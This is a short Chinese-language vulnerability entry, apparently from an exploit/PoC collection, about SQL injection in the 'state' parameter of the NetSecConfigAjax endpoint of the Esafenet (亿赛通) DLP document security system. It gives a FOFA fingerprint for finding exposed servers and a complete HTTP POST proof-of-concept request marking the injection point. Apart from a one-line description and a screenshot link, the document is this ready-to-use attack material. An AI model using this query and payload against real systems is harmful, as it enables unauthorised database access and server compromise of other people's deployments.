# 亿赛通电子文档安全管理系统NetSecConfigAjax接口存在SQL注入漏洞

亿某通电子文档安全管理系统` NetSecConfigAjax`接口的`state`参数处对传入的数据没有预编译和充足的校验，导致该接口存在SQL注入漏洞，恶意攻击者可能通过该漏洞获取服务器信息或者直接获取服务器权限

## fofa

```yaml
app="亿赛通-DLP"
```

## poc

```yaml
POST /CDGServer3/NetSecConfigAjax;Service HTTP/1.1
Host: 
Cookie: JSESSIONID=99CEC1B294F4EEEA7AFC46D8D4741917; JSESSIONID=06DCD58EDC037F785605A29CD7425C66
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: 
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Priority: u=0, i
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 98

command=updateNetSec&state=*
```

![image-20240718165313729](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407181654824.png)